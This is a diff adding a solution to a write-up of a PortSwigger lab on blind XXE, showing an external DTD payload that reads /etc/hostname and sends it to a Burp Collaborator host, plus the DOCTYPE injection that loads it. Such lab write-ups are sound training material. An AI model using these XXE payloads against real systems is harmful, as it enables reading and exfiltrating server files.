@@ -100,3 +100,31 @@ To solve the lab, exfiltrate the contents of the /etc/hostname file.
 
 ### Sol :
 
+* Click `check stock`, Intercept the request and send it to the repeater.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1fdc3ff1-6307-4364-ab33-b019b34f3597)
+
+* Go to `Exploit Server` and create a `dtd` payload of below:
+
+      <!ENTITY % file SYSTEM "file:///etc/hostname">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+      %eval;
+      %exfil;
+
+* Replace the `BURP-COLLABORATOR-SUBDOMAIN` with your own collaborator payload.
+* Save this payload with .dtd extension
+* Store the payload and click `View exploit` and take a note of URL.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/574bc151-ecfc-4e52-9ad9-ead0564cf9c3)
+
+* Give below payload as external entity definition in between the XML declaration and the `stockCheck` element by giving your own DTD URL.
+
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/608286ee-387a-4062-840a-9f69b9754dde)
+
+* Go to `Burp Collaborator` and see the `HTTP` request.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/338bcfe1-c2d9-4e4b-ba2c-6209faea1a56)
+
+* Enter the `x` code to solve the lab. Thus, the lab is solved.
